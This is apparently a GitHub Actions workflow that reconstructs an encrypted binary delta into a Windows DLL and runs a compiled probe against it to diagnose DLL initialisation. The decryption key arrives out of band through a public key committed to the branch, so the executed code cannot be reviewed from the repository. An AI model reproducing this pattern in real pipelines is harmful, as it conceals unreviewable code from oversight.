name: rc3-init-seh-diagnostic
on:
  push:
    branches: [rc3-native-gate-20260810r]
    paths: ['.github/workflows/rc3_init_diag.yml']
  workflow_dispatch:
permissions:
  actions: read
  contents: write
env:
  ARTIFACT_ID: '9034484495'
  HOST_SHA: '081c4c62d2bf377913eb2aca0cc3cf3bf656350c8abaa3aaf11d171dac604804'
  DELTA_B64_SHA: '28b6446caf5fdb7dcf194f58a1faf9ef59a51ff806dbeb4b55762f1d256daa30'
  DELTA_ENC_SHA: '0f943c6568801ff62fa4faccddc31bca3c2af90731c01a5a8f927bc81d16f76c'
  DELTA_XZ_SHA: '432be588c7550c8a49a4af46ea475716e9d378b21d5664456a3eaf734de1ae92'
  RC3_SHA: '1c2695f5f5d48228a9cfee18c31669cc27615d6d1c53bf83228aa015240a2b92'
jobs:
  init-diag:
    runs-on: windows-2022
    timeout-minutes: 35
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
          persist-credentials: true

      - name: Download verified baseline artifact
        uses: actions/download-artifact@v4
        with:
          artifact-ids: ${{ env.ARTIFACT_ID }}
          path: baseline_artifact
          github-token: ${{ github.token }}
          repository: ${{ github.repository }}
          run-id: '31300993195'
          merge-multiple: true

      - name: Bind baseline and encrypted delta
        shell: bash
        run: |
          set -euo pipefail
          test "$(sha256sum baseline_artifact/payload/HostCompat.dll | awk '{print $1}')" = "$HOST_SHA"
          : > "$RUNNER_TEMP/rc3.delta.enc.b64"
          for f in .rc3delta/chunk_00 .rc3delta/chunk_01 .rc3delta/chunk_02 .rc3delta/chunk_03 .rc3delta/chunk_04 .rc3delta/chunk_05 .rc3delta/chunk_06 .rc3delta/chunk_07 .rc3delta/chunk_08 .rc3delta/chunk_09; do cat "$f" >> "$RUNNER_TEMP/rc3.delta.enc.b64"; done
          test "$(wc -c < "$RUNNER_TEMP/rc3.delta.enc.b64")" = 74904
          b64_sha=$(sha256sum < "$RUNNER_TEMP/rc3.delta.enc.b64" | awk '{print $1}')
          test "$b64_sha" = "$DELTA_B64_SHA"
          base64 -d "$RUNNER_TEMP/rc3.delta.enc.b64" > "$RUNNER_TEMP/rc3.delta.xz.enc"
          enc_sha=$(sha256sum < "$RUNNER_TEMP/rc3.delta.xz.enc" | awk '{print $1}')
          test "$enc_sha" = "$DELTA_ENC_SHA"
          echo INIT_DIAG_DELTA_BINDING_PASS

      - name: Create one-time RSA key
        shell: bash
        run: |
          set -euo pipefail
          rm -rf .secure_rc3_diag
          mkdir -p .secure_rc3_diag
          openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:3072 -out "$RUNNER_TEMP/private_diag.pem"
          openssl pkey -in "$RUNNER_TEMP/private_diag.pem" -pubout -out .secure_rc3_diag/public.pem
          git config user.name windows-dll-test-bot
          git config user.email windows-dll-test-bot@users.noreply.github.com
          git add .secure_rc3_diag/public.pem
          git commit -m 'Publish RC3 Init diagnostic RSA public key'
          git push origin HEAD:${GITHUB_REF_NAME}
          echo INIT_DIAG_RSA_PUBLISHED

      - name: Receive wrapped AES key
        shell: bash
        run: |
          set -euo pipefail
          ok=0
          for i in $(seq 1 240); do
            git pull --ff-only origin "${GITHUB_REF_NAME}" >/dev/null 2>&1 || true
            if [ -s .secure_rc3_diag/key.enc.b64 ]; then ok=1; break; fi
            sleep 5
          done
          test "$ok" = 1
          base64 -d .secure_rc3_diag/key.enc.b64 > "$RUNNER_TEMP/key_diag.enc"
          openssl pkeyutl -decrypt -inkey "$RUNNER_TEMP/private_diag.pem" -in "$RUNNER_TEMP/key_diag.enc" -out "$RUNNER_TEMP/pass_diag.txt" -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256
          test -s "$RUNNER_TEMP/pass_diag.txt"

      - name: Reconstruct exact RC3
        shell: bash
        run: |
          set -euo pipefail
          openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in "$RUNNER_TEMP/rc3.delta.xz.enc" -out "$RUNNER_TEMP/rc3.delta.xz" -pass file:"$RUNNER_TEMP/pass_diag.txt"
          test "$(sha256sum < "$RUNNER_TEMP/rc3.delta.xz" | awk '{print $1}')" = "$DELTA_XZ_SHA"
          python - <<'PY'
          from pathlib import Path
          import hashlib,lzma,struct,os
          base=Path('baseline_artifact/payload/HostCompat.dll').read_bytes()
          raw=lzma.decompress((Path(os.environ['RUNNER_TEMP'])/'rc3.delta.xz').read_bytes())
          assert raw[:4]==b'R3D1'
          target_size,op_count=struct.unpack_from('<II',raw,4)
          pos=12; out=bytearray()
          for _ in range(op_count):
              op=raw[pos:pos+1]; pos+=1
              if op==b'C':
                  src,n=struct.unpack_from('<II',raw,pos); pos+=8; out.extend(base[src:src+n])
              elif op==b'L':
                  n,=struct.unpack_from('<I',raw,pos); pos+=4; out.extend(raw[pos:pos+n]); pos+=n
              else: raise SystemExit('bad opcode')
          assert pos==len(raw) and len(out)==target_size
          Path('rc3_payload').mkdir(exist_ok=True)
          Path('rc3_payload/SigProcDll-64HF.dll').write_bytes(out)
          print('RC3_SHA256='+hashlib.sha256(out).hexdigest())
          PY
          test "$(sha256sum rc3_payload/SigProcDll-64HF.dll | awk '{print $1}')" = "$RC3_SHA"
          rm -f "$RUNNER_TEMP/pass_diag.txt" "$RUNNER_TEMP/key_diag.enc" "$RUNNER_TEMP/private_diag.pem"

      - name: Configure MSVC x86
        uses: ilammy/msvc-dev-cmd@v1
        with:
          arch: x86

      - name: Compile SEH probe
        shell: cmd
        run: |
          cl /nologo /O2 /W4 /TC /EHsc diagnostics\sigproc_init_seh_probe.c /Fe:initprobe.exe > initprobe_build.txt 2>&1
          set RC=%ERRORLEVEL%
          type initprobe_build.txt
          if not "%RC%"=="0" exit /b %RC%

      - name: Run HostCompat and RC3 Init matrix
        shell: powershell
        run: |
          $ErrorActionPreference='Stop'
          Remove-Item init_probe.txt -ErrorAction SilentlyContinue
          foreach($target in @('HOST','RC3')){
            foreach($case in 0..3){
              $d="probe_${target}_${case}"
              New-Item -ItemType Directory -Force $d | Out-Null
              Copy-Item initprobe.exe "$d\initprobe.exe" -Force
              if($target -eq 'HOST'){
                Copy-Item baseline_artifact\payload\HostCompat.dll "$d\SigProcDll-64HF.dll" -Force
              } else {
                Copy-Item rc3_payload\SigProcDll-64HF.dll "$d\SigProcDll-64HF.dll" -Force
              }
              Copy-Item baseline_artifact\payload\runtime\inner-bed\* "$d\" -Force
              "===== TARGET=$target CASE=$case =====" | Tee-Object -FilePath init_probe.txt -Append
              Push-Location $d
              & .\initprobe.exe SigProcDll-64HF.dll $case 2>&1 | Tee-Object -FilePath ..\init_probe.txt -Append
              $exit=$LASTEXITCODE
              Pop-Location
              "TARGET=$target CASE=$case EXIT=$exit" | Tee-Object -FilePath init_probe.txt -Append
            }
          }
          Get-Content init_probe.txt
          'INIT_SEH_DIAGNOSTIC_COMPLETE' | Out-File init_diag_complete.txt

      - name: Upload diagnostic evidence
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: rc3-init-seh-diagnostic-${{ github.run_id }}
          path: |
            initprobe_build.txt
            init_probe.txt
            init_diag_complete.txt
          if-no-files-found: ignore
          retention-days: 14

      - name: Remove diagnostic RSA handoff
        if: always()
        shell: bash
        run: |
          git pull --ff-only origin "${GITHUB_REF_NAME}" || true
          rm -rf .secure_rc3_diag
          git add -A .secure_rc3_diag || true
          if ! git diff --cached --quiet; then
            git commit -m 'Remove RC3 Init diagnostic RSA handoff'
            git push origin HEAD:${GITHUB_REF_NAME} || true
          fi
